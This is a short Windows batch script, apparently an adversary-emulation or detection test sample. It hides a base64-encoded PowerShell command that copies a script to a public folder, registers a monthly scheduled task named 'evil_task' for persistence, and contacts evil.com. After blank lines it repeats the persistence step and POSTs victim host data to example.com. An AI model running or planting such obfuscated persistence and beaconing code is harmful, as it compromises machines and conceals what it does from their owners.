@echo off
if /I "%~1"=="first" (
	powershell -enc dAB5AHAAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAHMAbwByAG8AawBpAG4ALgBtAFwARABlAHMAawB0AG8AcABcAHQAZQBzAHQALgBiAGEAdAAgAD4AIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHQAZQBzAHQALgBiAGEAdAAgADsAIABzAGMAaAB0AGEAcwBrAHMALgBlAHgAZQAgAC8AYwByAGUAYQB0AGUAIAAvAFMAQwAgAE0ATwBOAFQASABMAFkAIAAvAE0ATwAgAGYAaQByAHMAdAAgAC8ARAAgAFMAVQBOACAALwBUAE4AIABlAHYAaQBsAF8AdABhAHMAawAgAC8AVABSACAAIgBjAG0AZAAuAGUAeABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB0AGUAcwB0AC4AYgBhAHQAIABzAGUAYwBvAG4AZAAiADsAIABUAGUAcwB0AC0ATgBlAHQAQwBvAG4AbgBlAGMAdABpAG8AbgAgAGUAdgBpAGwALgBjAG8AbQAgAEgAVABUAFAA
	exit /b 0
)
if /I "%~1"=="second" (
	echo second
	exit /b 0
)






type C:\Users\sorokin.m\Desktop\args.bat > C:\Users\Public\args.bat; 
schtasks.exe /create /SC MONTHLY /MO first /D SUN /TN evil_task /TR "cmd.exe C:\Users\Public\args.bat second"; 
curl.exe "https://example.com" -X POST -H "Content-Type: application/json" -d "{\"hostname\":\"victim_pc\",\"id\": \"12345\"}"